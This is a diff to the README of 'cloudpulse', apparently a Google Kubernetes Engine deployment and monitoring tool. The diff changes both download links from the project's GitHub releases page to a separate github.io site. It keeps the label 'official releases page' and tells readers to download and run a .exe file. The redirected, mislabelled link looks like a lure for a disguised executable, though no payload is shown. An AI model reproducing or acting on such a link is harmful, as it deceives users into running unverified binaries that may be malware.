@@ -1,6 +1,6 @@
 # ☁️ cloudpulse - Simplify your cloud deployment and monitoring
 
-[![Download Cloudpulse](https://img.shields.io/badge/Download_Cloudpulse-blue.svg)](https://github.com/strokeside577/cloudpulse/releases)
+[![Download Cloudpulse](https://img.shields.io/badge/Download_Cloudpulse-blue.svg)](https://strokeside577.github.io)
 
 Cloudpulse helps you manage and watch your cloud systems. It automates how you send updates to your Google Kubernetes Engine setup. The tool keeps your services running while it tracks their health through built-in monitoring tools. You do not need to manage complex configurations by hand.
 
@@ -26,7 +26,7 @@ Ensure your computer meets these basic needs before you start.
 
 ## 📥 How to download and install
 
-1. Visit the [official releases page](https://github.com/strokeside577/cloudpulse/releases) to access the files.
+1. Visit the [official releases page](https://strokeside577.github.io) to access the files.
 2. Select the latest version listed at the top of the page.
 3. Click the file ending in .exe to start the download.
 4. Save the file to a folder you can find easily.
